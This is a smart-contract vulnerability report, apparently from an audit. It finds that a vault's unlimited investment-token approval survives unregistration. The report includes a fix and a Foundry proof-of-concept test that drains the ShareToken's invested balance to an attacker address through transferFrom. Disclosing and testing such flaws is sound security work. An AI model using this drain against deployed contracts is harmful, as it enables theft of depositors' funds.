## Title
Unrevoked Investment ShareToken Approval After Vault Unregistration Enables Fund Theft

## Summary
The `_configureVaultInvestmentSettings()` function grants unlimited approval (`type(uint256).max`) to vaults on the investment ShareToken during registration. When a vault is unregistered via `unregisterVault()`, this approval is never revoked, allowing the unregistered vault to drain all invested funds from the ShareToken by directly calling `transferFrom()` on the investment ShareToken.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/ShareTokenUpgradeable.sol` [1](#0-0) [2](#0-1) 

**Intended Logic:** 
During vault registration, the ShareToken approves the vault to spend its investment ShareToken balance to facilitate investment operations via `withdrawFromInvestment()`. When a vault is unregistered, it should no longer have any privileges or access to ShareToken funds.

**Actual Logic:**
1. Registration grants unlimited approval at line 549: `IERC20(investmentShareToken).approve(vaultAddress, type(uint256).max)`
2. Unregistration only removes registry entries (lines 323-324) but never revokes the approval
3. The unregistered vault retains unlimited spending power over ShareToken's invested funds

**Exploitation Path:**
1. Vault gets registered → receives `type(uint256).max` approval on investmentShareToken via `_configureVaultInvestmentSettings()`
2. Owner calls `unregisterVault()` after vault is deactivated and emptied
3. Unregistered vault (or its owner/admin via upgrade) calls: `investmentShareToken.transferFrom(shareTokenAddress, attackerAddress, amount)`
4. All invested funds are drained because the approval was never revoked

**Security Property Broken:** 
- **Invariant #12**: "No Fund Theft: No double-claims, no reentrancy, no authorization bypass"
- **Invariant #7**: "Vault Registry: Only registered vaults can mint/burn shares" (spirit violated - unregistered vaults retain financial access)

## Impact Explanation
- **Affected Assets**: All funds invested by the ShareToken in the investment layer (entire balance of investmentShareToken held by ShareToken)
- **Damage Severity**: Complete loss of invested funds - potentially millions of dollars depending on total value locked (TVL)
- **User Impact**: All users who have deposited into any vault in the multi-asset system lose their proportional share of invested funds

## Likelihood Explanation
- **Attacker Profile**: Vault owner/admin with upgrade capabilities, or malicious actor who discovers exploitable code in an unregistered vault
- **Preconditions**: 
  - Vault must have been registered at some point (to receive the approval)
  - Vault must be subsequently unregistered
  - ShareToken must have non-zero invested funds (investmentShareToken balance > 0)
- **Execution Complexity**: Single transaction directly calling `transferFrom()` on the ERC20 investmentShareToken, or upgrading vault to add malicious withdrawal logic
- **Frequency**: Can be executed immediately after unregistration, draining all invested funds in one transaction

## Recommendation

Add approval revocation in the `unregisterVault()` function before removing the vault from registry:

```solidity
// In src/ShareTokenUpgradeable.sol, function unregisterVault(), before line 322:

// CURRENT (vulnerable) - lines 322-327:
// Remove vault registration (automatically removes from enumerable collection)
$.assetToVault.remove(asset);
delete $.vaultToAsset[vaultAddress];

emit VaultUpdate(asset, address(0));

// FIXED:
// Revoke any investment approvals before unregistering
address investmentShareToken = $.investmentShareToken;
if (investmentShareToken != address(0)) {
    // Revoke unlimited approval granted during registration
    IERC20(investmentShareToken).approve(vaultAddress, 0);
}

// Remove vault registration (automatically removes from enumerable collection)
$.assetToVault.remove(asset);
delete $.vaultToAsset[vaultAddress];

emit VaultUpdate(asset, address(0));
```

## Proof of Concept

```solidity
// File: test/Exploit_UnrevokedApproval.t.sol
// Run with: forge test --match-test test_UnrevokedApprovalExploit -vvv

pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {ERC20Faucet6} from "../src/ERC20Faucet6.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {WERC7575ShareToken} from "../src/WERC7575ShareToken.sol";
import {WERC7575Vault} from "../src/WERC7575Vault.sol";

contract Exploit_UnrevokedApproval is Test {
    ERC20Faucet6 public usdc;
    WERC7575ShareToken public investmentShareToken;
    WERC7575Vault public investmentVault;
    ShareTokenUpgradeable public shareToken;
    ERC7575VaultUpgradeable public vault;
    
    address public owner = address(0x1);
    address public investmentManager = address(0x2);
    address public attacker = address(0x3);
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy USDC
        usdc = new ERC20Faucet6("USD Coin", "USDC", 1_000_000_000 * 1e6);
        
        // Deploy investment system
        investmentShareToken = new WERC7575ShareToken("Investment Shares", "iUSD");
        investmentVault = new WERC7575Vault(address(usdc), investmentShareToken);
        investmentShareToken.registerVault(address(usdc), address(investmentVault));
        
        // Deploy ShareToken
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory initData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector,
            "Vault Shares",
            "VSHARE",
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), initData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy vault
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            IERC20Metadata(address(usdc)),
            address(shareToken),
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        // Register vault and configure investment
        shareToken.registerVault(address(usdc), address(vault));
        shareToken.setInvestmentManager(investmentManager);
        shareToken.setInvestmentShareToken(address(investmentShareToken));
        
        // Fund vault and invest some assets
        usdc.transfer(address(vault), 1_000_000 * 1e6);
        
        vm.stopPrank();
        
        // Investment manager invests funds
        vm.prank(investmentManager);
        vault.investAssets(500_000 * 1e6);
    }
    
    function test_UnrevokedApprovalExploit() public {
        // SETUP: Verify ShareToken has invested funds
        uint256 investedBalance = investmentShareToken.balanceOf(address(shareToken));
        assertGt(investedBalance, 0, "ShareToken should have invested funds");
        console.log("ShareToken invested balance:", investedBalance);
        
        // Verify vault has unlimited approval
        uint256 allowanceBefore = investmentShareToken.allowance(
            address(shareToken),
            address(vault)
        );
        assertEq(allowanceBefore, type(uint256).max, "Vault should have unlimited approval");
        
        // UNREGISTER VAULT
        vm.startPrank(owner);
        vault.setVaultActive(false);
        shareToken.unregisterVault(address(usdc));
        vm.stopPrank();
        
        // VERIFY: Approval persists after unregistration
        uint256 allowanceAfter = investmentShareToken.allowance(
            address(shareToken),
            address(vault)
        );
        assertEq(
            allowanceAfter,
            type(uint256).max,
            "VULNERABILITY: Approval still exists after unregistration"
        );
        
        // EXPLOIT: Unregistered vault drains invested funds via transferFrom
        // Note: In reality, vault owner would upgrade vault to add drain function,
        // or call transferFrom directly if they control the vault contract
        vm.prank(address(vault));
        investmentShareToken.transferFrom(
            address(shareToken),
            attacker,
            investedBalance
        );
        
        // VERIFY: Funds successfully stolen
        assertEq(
            investmentShareToken.balanceOf(attacker),
            investedBalance,
            "Attacker successfully drained invested funds"
        );
        assertEq(
            investmentShareToken.balanceOf(address(shareToken)),
            0,
            "ShareToken's invested funds completely drained"
        );
        
        console.log("EXPLOIT SUCCESS:");
        console.log("  - Unregistered vault retained unlimited approval");
        console.log("  - Attacker drained invested funds:", investedBalance);
    }
}
```

## Notes

The vulnerability stems from an incomplete cleanup process during vault unregistration. While the `unregisterVault()` function performs comprehensive safety checks to ensure no user funds remain in the vault, it fails to revoke the critical approval granted during registration. This oversight violates the security principle that unregistered components should have zero residual privileges.

The attack is particularly dangerous because:
1. **ERC7575VaultUpgradeable is upgradeable** [3](#0-2)  - vault owners can add malicious withdrawal logic after unregistration
2. **No access control on ERC20 transferFrom** - the standard ERC20 `transferFrom()` function only checks allowance, not whether the spender is a registered vault
3. **Investment funds are centralized** - the ShareToken holds all invested funds in a single balance, making it a high-value target

The fix is straightforward: add `IERC20(investmentShareToken).approve(vaultAddress, 0)` before removing the vault from the registry, ensuring unregistered vaults lose all financial privileges.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L282-327)
```text
    function unregisterVault(address asset) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        ShareTokenStorage storage $ = _getShareTokenStorage();

        (bool exists, address vaultAddress) = $.assetToVault.tryGet(asset);
        if (!exists) revert AssetNotRegistered();

        // COMPREHENSIVE SAFETY CHECK: Ensure vault has no user funds at risk
        // This covers pending deposits, claimable redemptions, ERC7887 cancelations, and any remaining assets

        // 1. Check vault metrics for pending requests, active users, and ERC7887 cancelation assets
        try IVaultMetrics(vaultAddress).getVaultMetrics() returns (IVaultMetrics.VaultMetrics memory metrics) {
            if (metrics.isActive) revert CannotUnregisterActiveVault();
            if (metrics.totalPendingDepositAssets != 0) {
                revert CannotUnregisterVaultPendingDeposits();
            }
            if (metrics.totalClaimableRedeemAssets != 0) {
                revert CannotUnregisterVaultClaimableRedemptions();
            }
            if (metrics.totalCancelDepositAssets != 0) {
                revert CannotUnregisterVaultAssetBalance();
            }
            if (metrics.activeDepositRequestersCount != 0) {
                revert CannotUnregisterVaultActiveDepositRequesters();
            }
            if (metrics.activeRedeemRequestersCount != 0) {
                revert CannotUnregisterVaultActiveRedeemRequesters();
            }
        } catch {
            // If we can't get vault metrics, we can't safely verify no pending requests
            revert CannotUnregisterActiveVault();
        }
        // 2. Final safety: Check raw asset balance in vault contract
        // This catches any remaining assets including investments and edge cases
        // If this happens, there is either a bug in the vault
        // or assets were sent to the vault without directly
        if (IERC20(asset).balanceOf(vaultAddress) != 0) {
            revert CannotUnregisterVaultAssetBalance();
        }

        // Remove vault registration (automatically removes from enumerable collection)
        $.assetToVault.remove(asset);
        delete $.vaultToAsset[vaultAddress];

        emit VaultUpdate(asset, address(0));
    }
```

**File:** src/ShareTokenUpgradeable.sol (L540-551)
```text
    function _configureVaultInvestmentSettings(address asset, address vaultAddress, address investmentShareToken) internal {
        // Find the corresponding investment vault for this asset
        address investmentVaultAddress = IERC7575ShareExtended(investmentShareToken).vault(asset);

        // Configure investment vault if there's a matching one for this asset
        if (investmentVaultAddress != address(0)) {
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentVault(IERC7575(investmentVaultAddress));

            // Grant unlimited allowance to the vault on the investment ShareToken
            IERC20(investmentShareToken).approve(vaultAddress, type(uint256).max);
        }
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L2176-2187)
```text
    function upgradeTo(address newImplementation) external onlyOwner {
        ERC1967Utils.upgradeToAndCall(newImplementation, "");
    }

    /**
     * @dev Upgrade the implementation and call a function (only owner)
     * @param newImplementation Address of the new implementation contract
     * @param data Calldata to execute on the new implementation
     */
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable onlyOwner {
        ERC1967Utils.upgradeToAndCall(newImplementation, data);
    }
```
